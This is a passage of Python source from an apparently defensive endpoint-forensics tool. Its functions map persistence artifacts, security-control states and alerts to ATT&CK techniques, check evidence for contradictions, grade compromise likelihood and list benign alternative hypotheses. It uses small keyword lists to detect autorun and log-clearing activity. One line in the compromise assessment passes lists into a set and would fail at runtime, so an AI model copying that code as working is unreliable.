            PersistenceIndicator(
                indicator_id=new_id("PERS"),
                host_id=task.host_id,
                mechanism="SCHEDULED_TASK",
                object_id=task.task_id,
                state=state,
                reason=reason,
                evidence_ids=task.evidence_ids,
                confidence=task.confidence,
                limitations=[
                    "Scheduled task configuration does not prove task execution.",
                    "Updates, backups, and administration commonly use scheduled tasks.",
                ],
            )
        )

    for reg in generic.get("registry_artifacts", []):
        key = str(reg.get("key") or reg.get("path") or reg.get("name") or "").lower()
        if any(marker in key for marker in ("run", "runonce", "startup", "launchagent", "launchdaemon", "autorun")):
            indicators.append(
                PersistenceIndicator(
                    indicator_id=new_id("PERS"),
                    host_id=reg.get("host_id"),
                    mechanism="REGISTRY_OR_CONFIG_AUTORUN",
                    object_id=str(reg.get("artifact_id") or key),
                    state=PersistenceState.PERSISTENCE_MECHANISM_OBSERVED,
                    reason="Autorun/startup configuration artifact observed.",
                    evidence_ids=reg.get("evidence_ids", []),
                    confidence=float(reg.get("confidence", 0.5)),
                    limitations=["Autorun configuration does not prove malicious persistence or execution."],
                )
            )

    for startup in generic.get("startup_artifacts", []):
        indicators.append(
            PersistenceIndicator(
                indicator_id=new_id("PERS"),
                host_id=startup.get("host_id"),
                mechanism="STARTUP_ARTIFACT",
                object_id=str(startup.get("artifact_id") or startup.get("name")),
                state=PersistenceState.PERSISTENCE_MECHANISM_OBSERVED,
                reason="Startup artifact observed.",
                evidence_ids=startup.get("evidence_ids", []),
                confidence=float(startup.get("confidence", 0.5)),
                limitations=["Startup artifact presence does not prove malicious persistence."],
            )
        )

    return indicators


def map_ttps(
    processes: List[ProcessObject],
    services: List[ServiceObject],
    tasks: List[ScheduledTaskObject],
    generic: Dict[str, List[Dict[str, Any]]],
    connections: List[ConnectionObject],
    dns: List[DNSArtifactObject],
    controls: List[SecurityControlObject],
    alerts: List[AlertObject],
    ioc_matches: List[IocMatch],
    persistence: List[PersistenceIndicator],
) -> List[TtpMapping]:
    mappings: List[TtpMapping] = []

    curr_obs = current_observed_ioc_ids(ioc_matches)
    curr_any = current_ioc_object_ids(ioc_matches)
    persistence_candidate_ids = {p.object_id for p in persistence if p.state == PersistenceState.PERSISTENCE_CANDIDATE}

    def add(
        host_id: Optional[str],
        technique_id: str,
        technique_name: str,
        behavior: str,
        state: TTPState,
        evidence_ids: List[str],
        confidence: float,
        limitations: List[str],
    ) -> None:
        mappings.append(
            TtpMapping(
                mapping_id=new_id("TTP"),
                host_id=host_id,
                technique_id=technique_id,
                technique_name=technique_name,
                behavior=behavior,
                state=state,
                evidence_ids=sorted(set(evidence_ids)),
                confidence=clamp(confidence),
                limitations=sorted(set(limitations + ["ATT&CK mapping is behavior-based and does not establish actor attribution."])),
            )
        )

    for svc in services:
        if svc.service_id in persistence_candidate_ids or svc.service_id in curr_any or svc.created_at:
            state = TTPState.TECHNIQUE_SUPPORTED if svc.service_id in curr_obs or svc.service_id in persistence_candidate_ids else TTPState.TECHNIQUE_CANDIDATE
            add(
                svc.host_id,
                "T1543.003",
                "Create or Modify System Process: Windows Service",
                f"Service '{svc.name}' observed with persistence-relevant context.",
                state,
                svc.evidence_ids,
                svc.confidence,
                ["Service creation/modification may be legitimate administration, installer, or software update."],
            )

    for task in tasks:
        if task.task_id in persistence_candidate_ids or task.task_id in curr_any or task.created_at:
            state = TTPState.TECHNIQUE_SUPPORTED if task.task_id in curr_obs or task.task_id in persistence_candidate_ids else TTPState.TECHNIQUE_CANDIDATE
            add(
                task.host_id,
                "T1053.005",
                "Scheduled Task/Job: Scheduled Task",
                f"Scheduled task '{task.name}' observed with persistence-relevant context.",
                state,
                task.evidence_ids,
                task.confidence,
                ["Scheduled task configuration does not prove execution or malicious intent."],
            )

    for reg in generic.get("registry_artifacts", []):
        key = str(reg.get("key") or reg.get("path") or reg.get("name") or "").lower()
        if any(marker in key for marker in ("run", "runonce", "startup", "autorun")):
            add(
                reg.get("host_id"),
                "T1547.001",
                "Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder",
                "Autorun registry/configuration artifact observed.",
                TTPState.TECHNIQUE_CANDIDATE,
                reg.get("evidence_ids", []),
                float(reg.get("confidence", 0.5)),
                ["Autorun configuration may be legitimate software or administration."],
            )

    for proc in processes:
        image = str(proc.image or "").lower()
        if image in SCRIPT_INTERPRETERS and (proc.process_id in curr_any or proc.process_id in persistence_candidate_ids or proc.parent_process_id):
            state = TTPState.TECHNIQUE_SUPPORTED if proc.process_id in curr_obs else TTPState.TECHNIQUE_CANDIDATE
            add(
                proc.host_id,
                "T1059",
                "Command and Scripting Interpreter",
                f"Script interpreter '{proc.image}' observed with contextual execution lineage.",
                state,
                proc.evidence_ids,
                proc.confidence,
                ["Script interpreter use may be legitimate administration, automation, or software update."],
            )

    for conn in connections:
        if conn.connection_id in curr_obs:
            add(
                conn.host_id,
                "T1071",
                "Application Layer Protocol",
                f"Observed connection to current IOC endpoint {conn.remote_domain or conn.remote_ip}.",
                TTPState.TECHNIQUE_SUPPORTED,
                conn.evidence_ids,
                conn.confidence,
                ["Connection to IOC endpoint may be scanner, sinkhole, security lookup, or benign service."],
            )

    for d in dns:
        if d.dns_id in curr_obs:
            add(
                d.host_id,
                "T1071",
                "Application Layer Protocol",
                f"Observed DNS resolution for current IOC domain {d.queried_domain}.",
                TTPState.TECHNIQUE_CANDIDATE,
                d.evidence_ids,
                d.confidence,
                ["DNS resolution alone does not prove successful network connection."],
            )

    for ctrl in controls:
        if ctrl.state in (SecurityControlState.OFFLINE, SecurityControlState.DISABLED_REPORTED, SecurityControlState.UNHEALTHY, SecurityControlState.DEGRADED):
            add(
                ctrl.host_id,
                "T1562.001",
                "Impair Defenses: Disable or Modify Tools",
                f"Security control '{ctrl.control_type}' state observed as {ctrl.state.name}.",
                TTPState.TECHNIQUE_CANDIDATE,
                ctrl.evidence_ids,
                ctrl.confidence,
                [
                    "Control degradation/offline may result from administration, outage, policy, software issue, or malicious action.",
                    "This mapping does not establish tampering intent.",
                ],
            )

    for alert in alerts:
        text = " ".join(str(x) for x in [alert.alert_name, alert.rule, alert.details]).lower()
        if any(marker in text for marker in ("deletion", "clear", "wipe", "anti-forensic", "log clear")):
            add(
                alert.host_id,
                "T1070",
                "Indicator Removal",
                f"Alert '{alert.alert_name}' suggests possible indicator removal context.",
                TTPState.TECHNIQUE_CANDIDATE,
                alert.evidence_ids,
                alert.confidence,
                ["Alert is detection evidence, not confirmed malicious anti-forensics."],
            )

    return mappings


def detect_contradictions(
    hosts: List[HostObject],
    processes: List[ProcessObject],
    files: List[FileObject],
    services: List[ServiceObject],
    tasks: List[ScheduledTaskObject],
    connections: List[ConnectionObject],
    controls: List[SecurityControlObject],
    alerts: List[AlertObject],
    iocs: List[IOCObject],
    generic: Dict[str, List[Dict[str, Any]]],
) -> List[str]:
    contradictions: List[str] = []

    # Hostname to multiple stable IDs.
    by_hostname: Dict[str, Set[str]] = defaultdict(set)
    for h in hosts:
        if h.hostname:
            stable = h.device_id or h.asset_id or h.host_id
            by_hostname[h.hostname.lower()].add(str(stable))

    for hn, ids in by_hostname.items():
        if len(ids) > 1:
            contradictions.append(
                f"Hostname '{hn}' is associated with multiple stable identifiers {sorted(ids)}; host-era resolution required."
            )

    # Process start/end inversion.
    for p in processes:
        if p.start_time and p.end_time and p.end_time < p.start_time:
            contradictions.append(f"Process {p.process_id} has end time before start time.")

    # File timestamp order anomaly.
    for f in files:
        if f.created_at and f.modified_at and f.created_at > f.modified_at:
            contradictions.append(
                f"File {f.file_id} created timestamp is after modified timestamp; may reflect copy, restore, parser issue, or tampering candidate."
            )

    # Same path multiple hashes.
    path_hashes: Dict[Tuple[Optional[str], Optional[str]], Set[str]] = defaultdict(set)
    for f in files:
        if f.path and f.sha256:
            path_hashes[(f.host_id, f.path)].add(f.sha256.lower())

    for key, hashes in path_hashes.items():
        if len(hashes) > 1:
            contradictions.append(f"Same file path {key} has multiple hashes {sorted(hashes)}; may reflect version change, replacement, or conflict.")

    # IOC status conflict.
    ioc_status: Dict[str, Set[str]] = defaultdict(set)
    for i in iocs:
        ioc_status[i.value.lower()].add(str(i.current_status or "unknown").lower())

    for value, statuses in ioc_status.items():
        if len(statuses) > 1:
            contradictions.append(f"IOC value '{value}' has conflicting status values {sorted(statuses)}.")

    # Security control conflict: active control plus alert claiming offline in same host.
    active_hosts = {c.host_id for c in controls if c.state == SecurityControlState.ACTIVE}
    offline_alert_hosts = {
        a.host_id
        for a in alerts
        if any(marker in " ".join(str(x) for x in [a.alert_name, a.rule, a.details]).lower() for marker in ("edr offline", "av disabled", "logging stopped"))
    }

    for host_id in active_hosts & offline_alert_hosts:
        contradictions.append(
            f"Host {host_id} has active security-control telemetry and alert/detection text suggesting control impairment; source/event-time reconciliation required."
        )

    return contradictions


def assess_compromise(
    hosts: List[HostObject],
    processes: List[ProcessObject],
    files: List[FileObject],
    services: List[ServiceObject],
    tasks: List[ScheduledTaskObject],
    connections: List[ConnectionObject],
    dns: List[DNSArtifactObject],
    controls: List[SecurityControlObject],
    alerts: List[AlertObject],
    ioc_matches: List[IocMatch],
    changes: List[ChangeObject],
    anomalies: List[AnomalyObject],
    persistence: List[PersistenceIndicator],
    contradictions: List[str],
    evidences: List[EvidenceRef],
    known_facts: Dict[str, Any],
    incident_context: Dict[str, Any],
) -> Tuple[CompromiseState, Dict[str, Any]]:
    curr_obs = current_observed_ioc_ids(ioc_matches)
    curr_any = current_ioc_object_ids(ioc_matches)

    signals: List[str] = []
    supporting_evidence_ids: Set[str] = set()

    if curr_obs:
        signals.append("CURRENT_OBSERVED_IOC")
        for m in ioc_matches:
            if m.object_id in curr_obs:
                supporting_evidence_ids.update(m.evidence_ids)

    if any(p.process_id in curr_obs for p in processes):
        signals.append("PROCESS_IOC_EXECUTION_CONTEXT")

    if any(f.file_id in curr_any for f in files):
        signals.append("FILE_IOC_PRESENT")

    if any(p.state == PersistenceState.PERSISTENCE_CANDIDATE for p in persistence):
        signals.append("PERSISTENCE_CANDIDATE")
        supporting_evidence_ids.update(
            p.evidence_ids for p in persistence if p.state == PersistenceState.PERSISTENCE_CANDIDATE
        )

    bad_controls = [c for c in controls if c.state in (SecurityControlState.OFFLINE, SecurityControlState.DISABLED_REPORTED, SecurityControlState.UNHEALTHY)]
    if bad_controls:
        signals.append("SECURITY_CONTROL_DEGRADATION")
        for c in bad_controls:
            supporting_evidence_ids.update(c.evidence_ids)

    material_anomalies = [a for a in anomalies if a.severity in (AnomalyState.SUSPICIOUS, AnomalyState.MATERIAL_SECURITY_SIGNAL)]
    if material_anomalies:
        signals.append("MATERIAL_BASELINE_ANOMALY")
        for a in material_anomalies:
            supporting_evidence_ids.update(a.evidence_ids)

    if any(a.severity == AnomalyState.UNUSUAL for a in anomalies):
        signals.append("UNUSUAL_BASELINE_DIFFERENCE")

    upstreams = {ev.upstream_source_id for ev in evidences if ev.evidence_id in supporting_evidence_ids}
    independent_support_count = len(upstreams)

    benign_weakening = []

    if known_facts.get("authorized_test_activity"):
        benign_weakening.append("AUTHORIZED_TEST_ACTIVITY")

    if known_facts.get("authorized_change_ticket"):
        benign_weakening.append("AUTHORIZED_CHANGE_TICKET")

    if known_facts.get("software_update_window"):
        benign_weakening.append("SOFTWARE_UPDATE_WINDOW")

    if known_facts.get("sinkhole_or_security_research"):
        benign_weakening.append("SINKHOLE_OR_SECURITY_RESEARCH")

    if contradictions:
        if len(signals) <= 2 or independent_support_count <= 1:
            return CompromiseState.DISPUTED, {
                "signals": signals,
                "independent_support_count": independent_support_count,
                "benign_weakening": benign_weakening,
                "contradictions": contradictions,
                "limitations": ["Contradictions prevent confident compromise assessment."],
            }

    if not signals:
        return CompromiseState.NO_COMPROMISE_EVIDENCE, {
            "signals": signals,
            "independent_support_count": independent_support_count,
            "benign_weakening": benign_weakening,
            "limitations": ["No material endpoint intelligence signal identified from supplied authorized evidence."],
        }

    if signals == ["UNUSUAL_BASELINE_DIFFERENCE"]:
        return CompromiseState.ANOMALOUS_ACTIVITY, {
            "signals": signals,
            "independent_support_count": independent_support_count,
            "benign_weakening": benign_weakening,
            "limitations": ["Baseline differences alone do not establish compromise."],
        }

    if "CURRENT_OBSERVED_IOC" not in signals and ("PERSISTENCE_CANDIDATE" in signals or "MATERIAL_BASELINE_ANOMALY" in signals):
        return CompromiseState.SUSPICIOUS_ACTIVITY, {
            "signals": signals,
            "independent_support_count": independent_support_count,
            "benign_weakening": benign_weakening,
            "limitations": ["Suspicious activity requires IOC/network/process/persistence corroboration before compromise conclusion."],
        }

    if "CURRENT_OBSERVED_IOC" in signals and ("PROCESS_IOC_EXECUTION_CONTEXT" in signals or "FILE_IOC_PRESENT" in signals):
        if independent_support_count >= 1:
            return CompromiseState.COMPROMISE_CANDIDATE, {
                "signals": signals,
                "independent_support_count": independent_support_count,
                "benign_weakening": benign_weakening,
                "limitations": ["Current IOC with process/file context supports compromise candidate, not full incident scope."],
            }

    if (
        "CURRENT_OBSERVED_IOC" in signals
        and ("PERSISTENCE_CANDIDATE" in signals or "SECURITY_CONTROL_DEGRADATION" in signals or "MATERIAL_BASELINE_ANOMALY" in signals)
        and independent_support_count >= 2
        and not benign_weakening
    ):
        if len(signals) >= 4 and independent_support_count >= 3:
            return CompromiseState.COMPROMISE_STRONGLY_SUPPORTED, {
                "signals": signals,
                "independent_support_count": independent_support_count,
                "benign_weakening": benign_weakening,
                "limitations": ["Strongly supported compromise assessment still does not establish actor attribution."],
            }

        return CompromiseState.COMPROMISE_SUPPORTED, {
            "signals": signals,
            "independent_support_count": independent_support_count,
            "benign_weakening": benign_weakening,
            "limitations": ["Supported compromise assessment requires incident/CTI follow-up for scope and attribution."],
        }

    return CompromiseState.INCONCLUSIVE, {
        "signals": signals,
        "independent_support_count": independent_support_count,
        "benign_weakening": benign_weakening,
        "limitations": ["Evidence is insufficient to resolve compromise status without additional authorized telemetry."],
    }


def build_facts(
    hosts: List[HostObject],
    processes: List[ProcessObject],
    files: List[FileObject],
    services: List[ServiceObject],
    tasks: List[ScheduledTaskObject],
    connections: List[ConnectionObject],
    dns: List[DNSArtifactObject],
    controls: List[SecurityControlObject],
    alerts: List[AlertObject],
    ioc_matches: List[IocMatch],
    changes: List[ChangeObject],
    anomalies: List[AnomalyObject],
    persistence: List[PersistenceIndicator],
    ttps: List[TtpMapping],
    compromise_state: CompromiseState,
    contradictions: List[str],
) -> List[FactRecord]:
    facts: List[FactRecord] = []

    for h in hosts:
        if h.device_id or h.asset_id:
            facts.append(
                FactRecord(
                    fact_id=new_id("FACT"),
                    statement=f"Host identity resolved using stable identifier(s): {h.host_id}.",
                    claim_type="DIRECT_ARTIFACT_FACT",
                    verification_state=VerificationState.SUPPORTED,
                    evidence_ids=h.evidence_ids,
                    object_ids=[h.host_id],
                    confidence=h.confidence,
                    limitations=["Stable host identifier proves platform/asset continuity context, not human operator identity."],
                )
            )
        else:
            facts.append(
                FactRecord(
                    fact_id=new_id("FACT"),
                    statement=f"Host identity for {h.host_id} is weak and relies on hostname or incomplete identifiers.",
                    claim_type="DIRECT_ARTIFACT_FACT",
                    verification_state=VerificationState.PARTIALLY_SUPPORTED,
                    evidence_ids=h.evidence_ids,
                    object_ids=[h.host_id],
                    confidence=h.confidence,
                    limitations=["Hostname may be reused, renamed, cloned, or templated."],
                )
            )

    for p in processes:
        if p.start_time and p.source_type in HIGH_TRUST_SOURCES:
            facts.append(
                FactRecord(
                    fact_id=new_id("FACT"),
                    statement=f"Process execution observed: {p.image or p.path} (PID {p.pid}) at {p.start_time.isoformat()}.",
                    claim_type="DIRECT_ARTIFACT_FACT",
                    verification_state=VerificationState.SUPPORTED,
                    evidence_ids=p.evidence_ids,
                    object_ids=[p.process_id],
                    confidence=p.confidence,
                    limitations=[
                        "Execution does not establish user intent.",
                        "Execution does not establish real-person attribution.",
                        "Execution does not establish maliciousness.",
                    ],
                )
            )

    for f in files:
        facts.append(
            FactRecord(
                fact_id=new_id("FACT"),
                statement=f"File artifact present: {f.path}.",
                claim_type="DIRECT_ARTIFACT_FACT",
                verification_state=VerificationState.SUPPORTED if f.sha256 else VerificationState.PARTIALLY_SUPPORTED,
                evidence_ids=f.evidence_ids,
                object_ids=[f.file_id],
                confidence=f.confidence,
                limitations=["File presence does not prove execution."],
            )
        )

    for m in ioc_matches:
        if m.observed and m.freshness == IOCFreshness.CURRENT:
            facts.append(
                FactRecord(
                    fact_id=new_id("FACT"),
                    statement=f"Current IOC observed in host telemetry: {m.relation_type} on {m.object_type} {m.object_id}.",
                    claim_type="CORRELATED_FACT",
                    verification_state=VerificationState.SUPPORTED,
                    evidence_ids=m.evidence_ids,
                    object_ids=[m.object_id, m.ioc_id],
                    confidence=m.confidence,
                    limitations=["IOC observation does not automatically establish compromise scope, actor, or campaign."],
                )
            )
        else:
            facts.append(
                FactRecord(
                    fact_id=new_id("FACT"),
                    statement=f"IOC context present but not observed as active host behavior: {m.relation_type} on {m.object_type} {m.object_id}.",
                    claim_type="DIRECT_ARTIFACT_FACT",
                    verification_state=VerificationState.PARTIALLY_SUPPORTED,
                    evidence_ids=m.evidence_ids,
                    object_ids=[m.object_id, m.ioc_id],
                    confidence=m.confidence,
                    limitations=["Embedded/present indicator is separate from observed connection, DNS, or execution."],
                )
            )

    for c in connections:
        facts.append(
            FactRecord(
                fact_id=new_id("FACT"),
                statement=f"Network connection observed to {c.remote_domain or c.remote_ip}:{c.remote_port}.",
                claim_type="DIRECT_ARTIFACT_FACT",
                verification_state=VerificationState.SUPPORTED,
                evidence_ids=c.evidence_ids,
                object_ids=[c.connection_id],
                confidence=c.confidence,
                limitations=["Connection alone does not prove C2, data transfer, or exfiltration."],
            )
        )

    for d in dns:
        facts.append(
            FactRecord(
                fact_id=new_id("FACT"),
                statement=f"DNS resolution observed for {d.queried_domain}.",
                claim_type="DIRECT_ARTIFACT_FACT",
                verification_state=VerificationState.SUPPORTED,
                evidence_ids=d.evidence_ids,
                object_ids=[d.dns_id],
                confidence=d.confidence,
                limitations=["DNS resolution alone does not prove successful network connection."],
            )
        )

    for pers in persistence:
        facts.append(
            FactRecord(
                fact_id=new_id("FACT"),
                statement=f"Persistence indicator observed: {pers.mechanism} ({pers.state.name}).",
                claim_type="CORRELATED_FACT" if pers.state == PersistenceState.PERSISTENCE_CANDIDATE else "DIRECT_ARTIFACT_FACT",
                verification_state=VerificationState.PARTIALLY_SUPPORTED if pers.state == PersistenceState.PERSISTENCE_CANDIDATE else VerificationState.SUPPORTED,
                evidence_ids=pers.evidence_ids,
                object_ids=[pers.object_id or pers.indicator_id],
                confidence=pers.confidence,
                limitations=["Persistence mechanism observation does not automatically mean malware or malicious persistence."],
            )
        )

    for ctrl in controls:
        facts.append(
            FactRecord(
                fact_id=new_id("FACT"),
                statement=f"Security control state observed: {ctrl.control_type} = {ctrl.state.name}.",
                claim_type="DIRECT_ARTIFACT_FACT",
                verification_state=VerificationState.SUPPORTED,
                evidence_ids=ctrl.evidence_ids,
                object_ids=[ctrl.control_id],
                confidence=ctrl.confidence,
                limitations=["Control state does not automatically establish tampering intent."],
            )
        )

    for a in anomalies:
        facts.append(
            FactRecord(
                fact_id=new_id("FACT"),
                statement=f"Baseline anomaly observed: {a.artifact} ({a.severity.name}).",
                claim_type="CORRELATED_FACT",
                verification_state=VerificationState.PARTIALLY_SUPPORTED,
                evidence_ids=a.evidence_ids,
                object_ids=[a.anomaly_id],
                confidence=a.confidence,
                limitations=["Baseline difference may reflect legitimate change, update, administration, peer difference, or data artifact."],
            )
        )

    for t in ttps:
        facts.append(
            FactRecord(
                fact_id=new_id("FACT"),
                statement=f"TTP mapping candidate/supported: {t.technique_id} {t.technique_name} ({t.state.name}).",
                claim_type="ANALYTICAL_INFERENCE",
                verification_state=VerificationState.PARTIALLY_SUPPORTED if t.state == TTPState.TECHNIQUE_SUPPORTED else VerificationState.INCONCLUSIVE,
                evidence_ids=t.evidence_ids,
                object_ids=[t.mapping_id],
                confidence=t.confidence,
                limitations=["ATT&CK mapping is behavior interpretation, not actor attribution."],
            )
        )

    facts.append(
        FactRecord(
            fact_id=new_id("FACT"),
            statement=f"Host compromise assessment: {compromise_state.name}.",
            claim_type="ANALYTICAL_INFERENCE",
            verification_state=VerificationState.PARTIALLY_SUPPORTED
            if compromise_state in (CompromiseState.COMPROMISE_SUPPORTED, CompromiseState.COMPROMISE_STRONGLY_SUPPORTED)
            else VerificationState.INCONCLUSIVE,
            evidence_ids=[],
            object_ids=[],
            confidence=0.70 if compromise_state in (CompromiseState.COMPROMISE_SUPPORTED, CompromiseState.COMPROMISE_STRONGLY_SUPPORTED) else 0.40,
            limitations=[
                "Compromise assessment does not automatically establish malware family, campaign, threat actor, or human operator.",
                "Consequential incident conclusions require INCIDENTINT/CTI and human review.",
            ],
        )
    )

    facts.append(
        FactRecord(
            fact_id=new_id("FACT"),
            statement="Real-person operator attribution is not established by supplied endpoint telemetry.",
            claim_type="UNKNOWN",
            verification_state=VerificationState.INCONCLUSIVE,
            evidence_ids=[],
            object_ids=[],
            confidence=0.99,
            limitations=[
                "Account, session, process, file, IP, and host artifacts do not automatically identify a real person.",
                "Consequential person attribution requires independent authorized evidence and human review.",
            ],
        )
    )

    return facts


def build_hypotheses(
    compromise_state: CompromiseState,
    processes: List[ProcessObject],
    files: List[FileObject],
    services: List[ServiceObject],
    tasks: List[ScheduledTaskObject],
    connections: List[ConnectionObject],
    controls: List[SecurityControlObject],
    ioc_matches: List[IocMatch],
    persistence: List[PersistenceIndicator],
    anomalies: List[AnomalyObject],
    known_facts: Dict[str, Any],
    incident_context: Dict[str, Any],
    contradictions: List[str],
    hosts: Optional[List[HostObject]] = None,
) -> List[Hypothesis]:
    hosts = hosts or []
    curr_obs = current_observed_ioc_ids(ioc_matches)

    suspicious_process = any(p.process_id in curr_obs for p in processes)
    suspicious_file = any(f.file_id in {m.object_id for m in ioc_matches if m.freshness == IOCFreshness.CURRENT} for f in files)
    observed_network = any(c.connection_id in curr_obs for c in connections)
    persistence_candidate = any(p.state == PersistenceState.PERSISTENCE_CANDIDATE for p in persistence)
    control_issue = any(c.state in (SecurityControlState.OFFLINE, SecurityControlState.DISABLED_REPORTED, SecurityControlState.UNHEALTHY) for c in controls)
    material_anomaly = any(a.severity in (AnomalyState.SUSPICIOUS, AnomalyState.MATERIAL_SECURITY_SIGNAL) for a in anomalies)

    hypotheses: List[Hypothesis] = []

    hypotheses.append(
        Hypothesis(
            id="H1",
            description="Observed activity represents authorized administration, IT operations, or approved change activity.",
            support_evidence=[
                "Known authorized change ticket present." if known_facts.get("authorized_change_ticket") else "",
                "Signed/publisher context present for services/software." if any(s.publisher for s in services) else "",
            ],
            opposition_evidence=[
                "Current IOC observed in host telemetry." if curr_obs else "",
                "Persistence candidate present." if persistence_candidate else "",
                "Security control degradation present." if control_issue else "",
            ],
            unknowns=["Change ticket linkage to specific process/service/task", "Administrator session identity"],
            falsification_criteria="Reject if activity correlates with current IOC, unexpected persistence, control impairment, and no authorized change evidence.",
            status=HypothesisStatus.CANDIDATE if known_facts.get("authorized_change_ticket") else HypothesisStatus.INCONCLUSIVE,
        )
    )

    hypotheses.append(
        Hypothesis(
            id="H2",
            description="Observed activity is software update, installer, or legitimate application behavior.",
            support_evidence=[
                "Update/installer path context." if any("update" in str(f.path or "").lower() or "install" in str(f.path or "").lower() for f in files) else "",
                "Known publisher/signature context." if any(f.publisher for f in files) or any(s.publisher for s in services) else "",
            ],
            opposition_evidence=[
                "Current IOC observed." if curr_obs else "",
                "Unexpected baseline anomaly." if material_anomaly else "",
                "Observed connection to IOC." if observed_network else "",
            ],
            unknowns=["Package provenance", "Update window", "Vendor binary legitimacy"],
            falsification_criteria="Reject if binary/path/signature/timing does not match known update behavior and IOC/network/persistence context dominates.",
            status=HypothesisStatus.CANDIDATE if not curr_obs and not observed_network else HypothesisStatus.INCONCLUSIVE,
        )
    )

    hypotheses.append(
        Hypothesis(
            id="H3",
            description="Observed activity is suspicious execution related to an incident or compromise candidate.",
            support_evidence=[
                "Current IOC observed in host telemetry." if curr_obs else "",
                "Process/file IOC context." if suspicious_process or suspicious_file else "",
                "Observed network connection to IOC." if observed_network else "",
                "Persistence candidate." if persistence_candidate else "",
                "Security control degradation." if control_issue else "",
                "Material baseline anomaly." if material_anomaly else "",
            ],
            opposition_evidence=[
                "Authorized test activity." if known_facts.get("authorized_test_activity") else "",
                "Authorized change ticket." if known_facts.get("authorized_change_ticket") else "",
                "Contradictions in evidence." if contradictions else "",
            ],
            unknowns=["Malware family", "Campaign", "Threat actor", "Full incident scope"],
            falsification_criteria="Downgrade if benign administrative/update/test explanation is independently corroborated and IOC/network/persistence evidence is stale or dependent.",
            status=HypothesisStatus.ACTIVE
            if compromise_state in (CompromiseState.COMPROMISE_CANDIDATE, CompromiseState.COMPROMISE_SUPPORTED, CompromiseState.COMPROMISE_STRONGLY_SUPPORTED)
            else HypothesisStatus.CANDIDATE,
        )
    )

    hypotheses.append(
        Hypothesis(
            id="H4",
            description="Telemetry is mis-correlated to the wrong host era, rebuilt host, duplicate hostname, or dependent alert pipeline.",
            support_evidence=[
                "Host identity weak." if any(not h.device_id and not h.asset_id for h in hosts) else "",
                "Contradictions present." if contradictions else "",
                "Multiple alerts may share upstream event family." if len({m.upstream_source_id for m in ioc_matches}) <= 1 else "",
            ],
            opposition_evidence=[
                "Stable host identifiers present." if hosts and all(h.device_id or h.asset_id for h in hosts) else "",
                "Independent upstream source families." if len({m.upstream_source_id for m in ioc_matches}) > 1 else "",
            ],
            unknowns=["Host rebuild/reimage timeline", "Agent reinstall history", "Alert deduplication correctness"],
            falsification_criteria="Reject if stable host era, independent sources, and correlated process/network/file evidence align.",
            status=HypothesisStatus.CANDIDATE if contradictions or any(not h.device_id and not h.asset_id for h in hosts) else HypothesisStatus.INCONCLUSIVE,
        )
    )

    hypotheses.append(
        Hypothesis(
            id="H5",
            description="IOC match is benign, stale, sinkholed, security-product-related, or dual-use.",
            support_evidence=[
                "IOC freshness stale/unknown." if any(m.freshness in (IOCFreshness.STALE, IOCFreshness.UNKNOWN) for m in ioc_matches) else "",
                "Sinkhole/security research context." if known_facts.get("sinkhole_or_security_research") else "",
            ],
            opposition_evidence=[
                "Current IOC observed in host telemetry." if curr_obs else "",
                "Process/network correlation." if suspicious_process and observed_network else "",
            ],
            unknowns=["IOC feed provenance", "Infrastructure reuse", "Security product lookup context"],
            falsification_criteria="Reject if IOC is current, observed in independent host telemetry, and correlated with process/network/persistence artifacts.",
            status=HypothesisStatus.CANDIDATE if not curr_obs else HypothesisStatus.REJECTED,
        )
    )

    hypotheses.append(
        Hypothesis(
            id="H6",
            description="Activity is authorized security testing, red-team, purple-team, or validation exercise.",
            support_evidence=["Known authorized test activity." if known_facts.get("authorized_test_activity") else ""],
            opposition_evidence=[
                "No test calendar evidence." if not known_facts.get("authorized_test_activity") else "",
                "Incident context suggests non-test activity." if incident_context.get("suspected_incident") else "",
            ],
            unknowns=["Test scope", "Test operator", "Approval window"],
            falsification_criteria="Reject if no authorized test record exists and evidence aligns with unauthorized incident indicators.",
            status=HypothesisStatus.ACTIVE if known_facts.get("authorized_test_activity") else HypothesisStatus.REJECTED,
        )
    )

    return [h for h in hypotheses if h.support_evidence or h.opposition_evidence or h.status != HypothesisStatus.REJECTED]


def independent_skeptic_review(
    compromise_state: CompromiseState,
    ioc_matches: List[IocMatch],
    alerts: List[AlertObject],
    processes: List[ProcessObject],
    files: List[FileObject],
    connections: List[ConnectionObject],
    persistence: List[PersistenceIndicator],
    controls: List[SecurityControlObject],
    contradictions: List[str],
    known_facts: Dict[str, Any],
) -> Dict[str, Any]:
    flags: List[str] = []
    alternatives: List[str] = []
    questions: List[str] = []

    if compromise_state in (CompromiseState.COMPROMISE_SUPPORTED, CompromiseState.COMPROMISE_STRONGLY_SUPPORTED):
        if not any(m.observed and m.freshness == IOCFreshness.CURRENT for m in ioc_matches):
            flags.append("COMPROMISE_CLAIM_WITHOUT_CURRENT_OBSERVED_IOC")

        if len({m.upstream_source_id for m in ioc_matches}) <= 1:
            flags.append("LOW_SOURCE_INDEPENDENCE_FOR_COMPROMISE_CLAIM")

    if any(not p.path and not p.image for p in processes):
        flags.append("PROCESS_IDENTITY_INCOMPLETE")
        alternatives.append("Unknown process may be legitimate, renamed, partially observed, or telemetry artifact.")

    if any(f.sha256 and not any(m.object_id == f.file_id and m.observed for m in ioc_matches) for f in files):
        alternatives.append("File presence/hash match does not prove execution.")

    if any(c.connection_id and not c.local_process_id for c in connections):
        flags.append("CONNECTION_PROCESS_ASSOCIATION_INCOMPLETE")
        alternatives.append("Connection may be generated by security product, browser, service, updater, sinkhole, or scanner.")

    if any(p.state == PersistenceState.PERSISTENCE_CANDIDATE for p in persistence):
        alternatives.append("Persistence mechanism may be legitimate software, installer, update, or administration.")

    if any(c.state in (SecurityControlState.OFFLINE, SecurityControlState.DISABLED_REPORTED, SecurityControlState.UNHEALTHY) for c in controls):
        alternatives.append("Security control degradation may result from outage, policy, maintenance, deployment issue, or malicious action.")
        flags.append("CONTROL_DEGRADATION_INTENT_NOT_ESTABLISHED")

    if contradictions:
        flags.append("CONTRADICTIONS_PRESENT")
        alternatives.append("Clock skew, host rebuild, duplicate hostname, parser issue, sensor lag, or dependent alert pipeline may explain conflicts.")

    if known_facts.get("authorized_test_activity"):
        flags.append("AUTHORIZED_TEST_ACTIVITY_MUST_BE_SEPARATED_FROM_REAL_INCIDENT")

    questions.extend(
        [
            "Are we equating unknown process with malware?",
            "Could this be authorized administration or software update?",
            "Could this be authorized security testing?",
            "Is the IOC current and independently observed?",
            "Are multiple alerts actually one upstream event family?",
            "Is host-era contamination possible?",
            "Is connection process association reliable?",
            "Does DNS resolution prove connection?",
            "Does file presence prove execution?",
